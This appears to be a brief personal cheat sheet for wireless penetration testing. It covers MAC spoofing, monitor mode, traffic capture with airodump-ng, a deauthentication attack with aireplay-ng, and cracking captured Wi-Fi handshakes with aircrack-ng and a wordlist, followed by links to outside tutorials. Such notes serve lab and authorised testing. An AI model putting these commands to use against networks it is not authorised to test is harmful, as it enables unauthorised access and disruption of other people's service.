
###########################
macchanger - change current mac address
###########################


iwconfig

ifconfig wlanmon0 down

macchanger -r wlan0mon

macchanger -m newmacaddress wlan0mon

###########################
Promiscous Mode or Monitor Mode
###########################

#shutdown wireless card
ifconfig wlan0 down

#show network cards status
ifconfig

#config wireless card in monitor mode
iwconfig wlan0 mode monitor

#show wireless status
iwconfig

#power wireless lan card
ifconfig wlan0 up

#show network status
ifconfig

# configure wireless card back into normal mode
iwconfig wlan0 mode managed

###########################

#config wireless card in monitor mode
airmon-ng start wlan0


###########################
airodump-ng - capture network traffic
###########################

airodump-ng [option] <interface>

-c <channel>

-d <bssid>
--bssid <bssid>

-w <dumpfile>

WEP 

airodump-ng --channel 6 --bssid <mac> --write <filename> wlan0mon

aircrack-ng <filename>

WPA

WPA

TKIP - Temporal Key Integrity Protocol

WPA2

CCMP - Counter Mode Block Chain Message Authentication Code Protocol




https://www.hackers-arise.com/post/osint-tracking-the-suspect-s-precise-location-using-wigle-net


https://www.bettercap.org/

https://en.kali.tools/?p=52

https://executeatwill.com/2020/01/05/Wireless-Wifi-Penetration-Testing-Hacker-Notes/




# list wireless devices
iwconfig

# kill process that would interfere with the wireless network airmong-ng check kill
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0

#confirm
iwconfig

# Searching nearby area of wifi networks
airodump-ng wlan0mon

# BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID   
# 5C:A6:E6:B9:CF:12  -15       15        0    0   3  270   WPA2 CCMP   PSK  Wireless Lab 

# capture frames for the device with <mac> 
airodump-ng -c 6 --bssid <mac> -w capturedframes wlan0mon



# Performing a DEAUTH attack
aireplay-ng -0 1 -a <mac> -c <mac2> wlan1

aireplay-ng -0 5 -a <mac> --ignore-negative wlan1

-a = Wifi mac address 
-c = Station (client)


# Cracking the captured data
aircrack-ng -w wordlist.txt -b <mac> capturedframes.cap





### 

<https://blog.samcater.com/capturing-beacons-and-probe-requests-of-public-wifi-access-points-the-why-how-and-stats/>
